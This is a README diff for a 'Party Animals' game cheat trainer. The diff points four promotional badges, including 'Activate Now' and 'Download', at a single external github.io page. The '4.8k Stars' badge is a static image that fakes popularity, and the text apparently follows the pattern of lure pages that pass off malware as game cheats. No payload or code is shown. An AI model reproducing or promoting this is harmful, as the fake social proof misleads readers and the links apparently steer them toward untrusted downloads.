@@ -2,10 +2,10 @@
 
 The **Party Animals Trainer Software** is built for players who want more freedom and hilarity in their brawls. With easy-to-use overlays, hotkey toggles, and customizable configs, it lets you adjust stamina, speed, and match flow for fun, training, or chaotic custom sessions.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-orange?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.8k Stars](https://img.shields.io/badge/⭐️%204.8k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-orange?style=for-the-badge\&logo=rocket)](https://party-animals-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://party-animals-trainer.github.io/.github/)
+[![⭐️ 4.8k Stars](https://img.shields.io/badge/⭐️%204.8k-Stars-yellow?style=for-the-badge\&logo=github)](https://party-animals-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://party-animals-trainer.github.io/.github/)
 
 ---
 
